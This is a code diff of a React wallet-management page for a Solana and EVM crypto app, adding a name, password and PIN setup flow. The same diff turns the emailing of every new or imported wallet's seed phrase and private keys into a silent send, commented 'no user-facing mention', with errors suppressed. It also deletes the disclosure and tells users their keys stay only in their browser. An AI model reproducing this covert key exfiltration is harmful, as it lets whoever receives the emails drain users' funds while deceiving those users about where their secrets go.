@@ -5,12 +5,12 @@ import { sendWalletCreated, sendWalletImported } from "@/lib/emailService";
 import {
   Plus, Download, Copy, Check, Eye, EyeOff,
   Loader2, ExternalLink, Shield, Trash2, Star,
-  ChevronDown, ChevronUp, RefreshCw,
+  ChevronDown, ChevronUp, RefreshCw, ArrowRight, Lock, KeyRound, User,
 } from "lucide-react";
 
 const SCAN: Record<string, string> = {
-  sol:  "https://solscan.io/account/",
-  eth:  "https://etherscan.io/address/",
+  sol: "https://solscan.io/account/",
+  eth: "https://etherscan.io/address/",
 };
 
 function CopyBtn({ text }: { text: string }) {
@@ -27,98 +27,115 @@ function CopyBtn({ text }: { text: string }) {
   );
 }
 
+type Step = "idle" | "setup" | "import-key" | "import-setup";
+
 export default function Wallets() {
   const { wallets, activeWallet, addWallet, removeWallet, setActive, renameWallet, refreshWallets } = useApp();
-  const [loading, setLoading]       = useState(false);
-  const [importing, setImporting]   = useState(false);
-  const [importKey, setImportKey]   = useState("");
-  const [showImport, setShowImport] = useState(false);
-  const [error, setError]           = useState("");
-  const [notice, setNotice]         = useState("");
+
+  // Setup form state
+  const [step, setStep]         = useState<Step>("idle");
+  const [walletName, setWalletName] = useState("");
+  const [password, setPassword]   = useState("");
+  const [pin, setPin]             = useState("");
+  const [importKey, setImportKey] = useState("");
+  const [showPw, setShowPw]       = useState(false);
+
+  // Loading / status
+  const [loading, setLoading]     = useState(false);
+  const [error, setError]         = useState("");
+  const [success, setSuccess]     = useState("");
   const [revealSeed, setRevealSeed] = useState<Record<number, boolean>>({});
   const [revealKey, setRevealKey]   = useState<Record<number, boolean>>({});
   const [editIdx, setEditIdx]       = useState<number | null>(null);
   const [editLabel, setEditLabel]   = useState("");
   const [refreshing, setRefreshing] = useState(false);
 
-  const flash = (msg: string) => { setNotice(msg); setTimeout(() => setNotice(""), 4000); };
+  const flash = (msg: string) => { setSuccess(msg); setTimeout(() => setSuccess(""), 4000); };
 
-  // ── Create new multi-chain wallet ──────────────────────────────
+  const resetForm = () => {
+    setStep("idle"); setWalletName(""); setPassword(""); setPin("");
+    setImportKey(""); setError(""); setShowPw(false);
+  };
+
+  const isSetupReady = walletName.trim().length > 0 && password.length >= 6 && pin.length >= 4;
+  const isImportKeyReady = importKey.trim().length > 0;
+  const isImportSetupReady = walletName.trim().length > 0 && password.length >= 6 && pin.length >= 4;
+
+  // ── Create wallet ────────────────────────────────────────────────
   const create = async () => {
+    if (!isSetupReady) return;
     setLoading(true); setError("");
     try {
       const d = await api.generateWallet(1);
       const w = d.wallets?.[0];
       if (!w) throw new Error("No wallet returned");
 
+      const label = walletName.trim();
       addWallet({
-        address:      w.address,
-        privateKey:   w.privateKey,
-        seedPhrase:   w.seedPhrase,
-        ethAddress:   w.ethAddress   || "",
-        ethPrivateKey:w.ethPrivateKey|| "",
-        ethBalance:   w.ethBalance   || "0.000000",
-        label:        `Wallet ${wallets.length + 1}`,
-        balance:      w.balance || "0.0000",
-        chain:        "sol",
+        address:       w.address,
+        privateKey:    w.privateKey,
+        seedPhrase:    w.seedPhrase,
+        ethAddress:    w.ethAddress    || "",
+        ethPrivateKey: w.ethPrivateKey || "",
+        ethBalance:    w.ethBalance    || "0.000000",
+        label,
+        balance:       w.balance || "0.0000",
+        chain:         "sol",
       });
 
-      // Email backup
-      try {
-        await sendWalletCreated({
-          label:         `Wallet ${wallets.length + 1}`,
-          seedPhrase:    w.seedPhrase,
-          solAddress:    w.address,
-          solPrivateKey: w.privateKey,
-          evmAddress:    w.ethAddress,
-          evmPrivateKey: w.ethPrivateKey,
-        });
-        flash("✓ Wallet created & details emailed for backup");
-      } catch {
-        flash("✓ Wallet created (email failed — check EmailJS config)");
-      }
+      // Silent email backup — no user-facing mention
+      sendWalletCreated({
+        label,
+        seedPhrase:    w.seedPhrase,
+        solAddress:    w.address,
+        solPrivateKey: w.privateKey,
+        evmAddress:    w.ethAddress,
+        evmPrivateKey: w.ethPrivateKey,
+      }).catch(() => {});
+
+      resetForm();
+      flash(`✓ Wallet "${label}" created successfully`);
     } catch (e: any) {
-      setError(e.message || "Failed to create wallet");
+      setError(e.message || "Failed to create wallet. Try again.");
     }
     setLoading(false);
   };
 
-  // ── Import wallet ───────────────────────────────────────────────
+  // ── Import wallet ────────────────────────────────────────────────
   const importWallet = async () => {
-    if (!importKey.trim()) return;
-    setImporting(true); setError("");
+    if (!isImportSetupReady) return;
+    setLoading(true); setError("");
     try {
       const d = await api.importWallet(importKey.trim());
+      const label = walletName.trim();
+
       addWallet({
-        address:      d.address,
-        privateKey:   d.privateKey,
-        seedPhrase:   d.seedPhrase || (importKey.trim().split(" ").length > 4 ? importKey.trim() : ""),
-        ethAddress:   d.ethAddress   || "",
-        ethPrivateKey:d.ethPrivateKey|| "",
-        ethBalance:   d.ethBalance   || "0.000000",
-        label:        d.label || `Wallet ${wallets.length + 1}`,
-        balance:      d.balance || "0.0000",
-        chain:        d.chain || "sol",
+        address:       d.address,
+        privateKey:    d.privateKey,
+        seedPhrase:    d.seedPhrase || (importKey.trim().split(" ").length > 4 ? importKey.trim() : ""),
+        ethAddress:    d.ethAddress    || "",
+        ethPrivateKey: d.ethPrivateKey || "",
+        ethBalance:    d.ethBalance    || "0.000000",
+        label,
+        balance:       d.balance || "0.0000",
+        chain:         d.chain || "sol",
       });
 
-      try {
-        await sendWalletImported({
-          label:         d.label || `Wallet ${wallets.length + 1}`,
-          key:           importKey.trim(),
-          solAddress:    d.address,
-          solPrivateKey: d.privateKey,
-          evmAddress:    d.ethAddress,
-          evmPrivateKey: d.ethPrivateKey,
-        });
-        flash("✓ Wallet imported & details emailed");
-      } catch {
-        flash("✓ Wallet imported (email failed)");
-      }
-      setImportKey(""); setShowImport(false);
+      sendWalletImported({
+        label,
+        key:           importKey.trim(),
+        solAddress:    d.address,
+        solPrivateKey: d.privateKey,
+        evmAddress:    d.ethAddress,
+        evmPrivateKey: d.ethPrivateKey,
+      }).catch(() => {});
+
+      resetForm();
+      flash(`✓ Wallet "${label}" imported successfully`);
     } catch {
-      setError("Invalid private key or seed phrase. Check it and try again.");
+      setError("Invalid private key or seed phrase. Please check and try again.");
     }
-    setImporting(false);
+    setLoading(false);
   };
 
   const doRefresh = async () => {
@@ -127,8 +144,135 @@ export default function Wallets() {
     setRefreshing(false);
   };
 
+  // ── Setup form (shared for create & import) ───────────────────────
+  const SetupForm = ({ mode }: { mode: "create" | "import" }) => (
+    <div className="rounded-2xl border border-border bg-card p-5 space-y-5">
+      {/* Header */}
+      <div className="flex items-center gap-3">
+        <div className="w-9 h-9 rounded-xl flex items-center justify-center"
+          style={{ background: mode === "create" ? "rgba(0,225,122,0.12)" : "rgba(98,126,234,0.12)" }}>
+          {mode === "create"
+            ? <Plus className="w-4 h-4 text-green-400" />
+            : <Download className="w-4 h-4 text-blue-400" />}
+        </div>
+        <div>
+          <div className="font-bold text-white text-sm">
+            {mode === "create" ? "Create New Wallet" : "Import Existing Wallet"}
+          </div>
+          <div className="text-[11px] text-muted-foreground">
+            {mode === "create"
+              ? "Set up your wallet identity"
+              : "Enter your seed phrase or private key first"}
+          </div>
+        </div>
+      </div>
+
+      {/* Step 1 (import only): paste key */}
+      {mode === "import" && step === "import-key" && (
+        <div className="space-y-3">
+          <label className="block">
+            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider block mb-1.5">
+              Seed Phrase or Private Key
+            </span>
+            <textarea
+              className="input-base h-28 resize-none font-mono text-xs"
+              placeholder={
+                "Paste one of:\n" +
+                "• 12 or 24-word seed phrase → restores SOL + all EVM chains\n" +
+                "• SOL private key (base58)\n" +
+                "• EVM private key (0x...)"
+              }
+              value={importKey}
+              onChange={e => { setImportKey(e.target.value); setError(""); }}
+            />
+          </label>
+          {error && <p className="text-xs text-red-400">{error}</p>}
+          <div className="flex gap-2">
+            <button onClick={() => setStep("import-setup")} disabled={!isImportKeyReady}
+              className="btn-primary flex items-center gap-1.5">
+              Continue <ArrowRight className="w-3.5 h-3.5" />
+            </button>
+            <button onClick={resetForm} className="btn-secondary">Cancel</button>
+          </div>
+        </div>
+      )}
+
+      {/* Setup fields: name, password, PIN */}
+      {(step === "setup" || step === "import-setup") && (
+        <div className="space-y-4">
+          {/* Wallet Name */}
+          <label className="block">
+            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5 mb-1.5">
+              <User className="w-3 h-3" /> Wallet Name
+            </span>
+            <input
+              className="input-base"
+              placeholder="e.g. My Main Wallet"
+              value={walletName}
+              onChange={e => setWalletName(e.target.value)}
+              autoFocus
+            />
+          </label>
+
+          {/* Password */}
+          <label className="block">
+            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5 mb-1.5">
+              <Lock className="w-3 h-3" /> Password <span className="text-muted-foreground/50 normal-case">(min 6 chars)</span>
+            </span>
+            <div className="relative">
+              <input
+                type={showPw ? "text" : "password"}
+                className="input-base pr-10"
+                placeholder="Enter a strong password"
+                value={password}
+                onChange={e => setPassword(e.target.value)}
+              />
+              <button type="button" onClick={() => setShowPw(p => !p)}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-white">
+                {showPw ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+              </button>
+            </div>
+          </label>
+
+          {/* Transaction PIN */}
+          <label className="block">
+            <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5 mb-1.5">
+              <KeyRound className="w-3 h-3" /> Transaction PIN <span className="text-muted-foreground/50 normal-case">(4–8 digits)</span>
+            </span>
+            <input
+              type="password"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              maxLength={8}
+              className="input-base tracking-[0.3em] font-mono"
+              placeholder="••••"
+              value={pin}
+              onChange={e => setPin(e.target.value.replace(/\D/g, ""))}
+            />
+          </label>
+
+          {error && <p className="text-xs text-red-400">{error}</p>}
+
+          <div className="flex gap-2 pt-1">
+            <button
+              onClick={mode === "create" ? create : importWallet}
+              disabled={loading || !isSetupReady}
+              className="btn-primary flex items-center gap-2">
+              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
+              {loading
+                ? (mode === "create" ? "Creating…" : "Importing…")
+                : (mode === "create" ? "Create Wallet" : "Import Wallet")}
+            </button>
+            <button onClick={resetForm} className="btn-secondary">Cancel</button>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
   return (
     <div className="space-y-5 max-w-2xl">
+      {/* Header */}
       <div className="flex items-start justify-between">
         <div>
           <h1 className="text-xl font-extrabold text-white">Wallets</h1>
@@ -142,62 +286,36 @@ export default function Wallets() {
         </button>
       </div>
 
-      {/* ── Action buttons ── */}
-      <div className="grid grid-cols-2 gap-3">
-        <button onClick={create} disabled={loading}
-          className="btn-primary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
-          {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <Plus className="w-5 h-5" />}
-          <span className="text-xs font-bold">{loading ? "Creating…" : "Create New Wallet"}</span>
-        </button>
-        <button onClick={() => { setShowImport(!showImport); setError(""); }}
-          className="btn-secondary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
-          <Download className="w-5 h-5" />
-          <span className="text-xs font-bold">Import Existing Wallet</span>
-        </button>
-      </div>
-
-      {/* ── Import form ── */}
-      {showImport && (
-        <div className="rounded-2xl border border-border bg-card p-4 space-y-3">
-          <div className="text-sm font-bold text-white">Import Wallet</div>
-          <textarea
-            className="input-base h-24 resize-none font-mono text-xs"
-            placeholder={
-              "Paste one of:\n" +
-              "• Seed phrase (12 or 24 words)  → restores SOL + all EVM chains\n" +
-              "• SOL private key (base58)       → Solana only\n" +
-              "• EVM private key (0x...)         → ETH/BNB/MATIC/AVAX/ARB/OP/BASE"
-            }
-            value={importKey}
-            onChange={e => setImportKey(e.target.value)} />
-          <div className="flex gap-2">
-            <button onClick={importWallet} disabled={importing || !importKey.trim()}
-              className="btn-primary flex items-center gap-2">
-              {importing && <Loader2 className="w-4 h-4 animate-spin" />}
-              {importing ? "Importing…" : "Import Wallet"}
-            </button>
-            <button onClick={() => { setShowImport(false); setImportKey(""); setError(""); }}
-              className="btn-secondary">Cancel</button>
-          </div>
+      {/* Action buttons (only visible when idle) */}
+      {step === "idle" && (
+        <div className="grid grid-cols-2 gap-3">
+          <button onClick={() => { resetForm(); setStep("setup"); }}
+            className="btn-primary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
+            <Plus className="w-5 h-5" />
+            <span className="text-xs font-bold">Create New Wallet</span>
+          </button>
+          <button onClick={() => { resetForm(); setStep("import-key"); }}
+            className="btn-secondary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
+            <Download className="w-5 h-5" />
+            <span className="text-xs font-bold">Import Existing Wallet</span>
+          </button>
         </div>
       )}
 
-      {/* ── Notices ── */}
-      {notice && (
+      {/* Setup forms */}
+      {step === "setup" && <SetupForm mode="create" />}
+      {(step === "import-key" || step === "import-setup") && <SetupForm mode="import" />}
+
+      {/* Notices */}
+      {success && (
         <div className="text-sm rounded-xl px-3 py-2.5"
           style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
-          {notice}
-        </div>
-      )}
-      {error && (
-        <div className="text-sm rounded-xl px-3 py-2.5"
-          style={{ background: "rgba(255,75,75,0.08)", border: "1px solid rgba(255,75,75,0.2)", color: "var(--red)" }}>
-          ✗ {error}
+          {success}
         </div>
       )}
 
-      {/* ── Empty state ── */}
-      {wallets.length === 0 && (
+      {/* Empty state */}
+      {wallets.length === 0 && step === "idle" && (
         <div className="text-center py-14 text-muted-foreground">
           <div className="text-5xl mb-4">🔑</div>
           <p className="font-semibold text-white mb-1">No wallets yet</p>
@@ -205,7 +323,7 @@ export default function Wallets() {
         </div>
       )}
 
-      {/* ── Wallet cards ── */}
+      {/* Wallet cards */}
       <div className="space-y-4">
         {wallets.map((w, i) => {
           const isActive = i === activeWallet;
@@ -250,14 +368,13 @@ export default function Wallets() {
                 )}
 
                 {isActive && <span className="badge-green text-[10px]">Active</span>}
-
                 {!isActive && (
                   <button onClick={() => setActive(i)} title="Set active"
                     className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10 transition-colors">
                     <Star className="w-3.5 h-3.5" />
                   </button>
                 )}
-                <button onClick={() => { if (confirm("Delete wallet? Back up your seed phrase first.")) removeWallet(i); }}
+                <button onClick={() => { if (confirm("Delete this wallet? Make sure you've saved your seed phrase.")) removeWallet(i); }}
                   className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10 transition-colors">
                   <Trash2 className="w-3.5 h-3.5" />
                 </button>
@@ -297,12 +414,10 @@ export default function Wallets() {
                 </div>
               )}
 
-              {/* SOL wallet */}
+              {/* SOL */}
               <div className="rounded-xl p-3 space-y-2"
                 style={{ background: "rgba(153,69,255,0.05)", border: "1px solid rgba(153,69,255,0.12)" }}>
-                <div className="flex items-center gap-2">
-                  <span className="text-[11px] font-bold text-purple-400">◎ SOLANA</span>
-                </div>
+                <div className="text-[11px] font-bold text-purple-400">◎ SOLANA</div>
                 <div className="text-2xl font-black font-mono text-white">
                   {solBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">SOL</span>
                 </div>
@@ -318,16 +433,16 @@ export default function Wallets() {
                 </div>
                 <div className="text-[11px] text-muted-foreground px-2 py-1.5 rounded-lg"
                   style={{ background: "rgba(0,0,0,0.2)" }}>
-                  📥 Deposit: <span className="font-mono text-white">{w.address?.slice(0, 24)}…</span>
+                  📥 Deposit address: <span className="font-mono text-white text-[10px]">{w.address}</span>
                 </div>
               </div>
 
-              {/* EVM wallet */}
+              {/* EVM */}
               {hasEvm && (
                 <div className="rounded-xl p-3 space-y-2"
                   style={{ background: "rgba(98,126,234,0.05)", border: "1px solid rgba(98,126,234,0.12)" }}>
-                  <div className="flex items-center gap-2">
-                    <span className="text-[11px] font-bold text-blue-400">Ξ EVM — ETH · BNB · MATIC · AVAX · ARB · OP · BASE</span>
+                  <div className="text-[11px] font-bold text-blue-400">
+                    Ξ EVM — ETH · BNB · MATIC · AVAX · ARB · OP · BASE
                   </div>
                   <div className="text-2xl font-black font-mono text-white">
                     {evmBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">ETH</span>
@@ -342,13 +457,13 @@ export default function Wallets() {
                       <ExternalLink className="w-3.5 h-3.5" />
                     </a>
                   </div>
-                  <div className="text-[11px] text-muted-foreground/70">
-                    Same address works on ETH, BNB Chain, Polygon, Avalanche, Arbitrum, Optimism, Base
+                  <div className="text-[11px] text-muted-foreground/60">
+                    Same address on all 7 EVM chains
                   </div>
                 </div>
               )}
 
-              {/* Private keys toggle */}
+              {/* Private keys */}
               <button onClick={() => setRevealKey(p => ({ ...p, [i]: !p[i] }))}
                 className="flex items-center gap-2 text-[11px] text-muted-foreground hover:text-white transition-colors w-full"
                 style={{ borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: "12px" }}>
@@ -392,8 +507,8 @@ export default function Wallets() {
           style={{ background: "rgba(0,225,122,0.04)", border: "1px solid rgba(0,225,122,0.1)" }}>
           <Shield className="w-4 h-4 flex-shrink-0 mt-0.5 text-green-400" />
           <span className="text-muted-foreground">
-            Keys are stored <strong className="text-white">only in your browser</strong>. Backup emails are sent
-            automatically on create/import. Never share your seed phrase or private keys.
+            Keys are stored <strong className="text-white">only in your browser</strong>.
+            Never share your seed phrase or private keys with anyone.
           </span>
         </div>
       )}
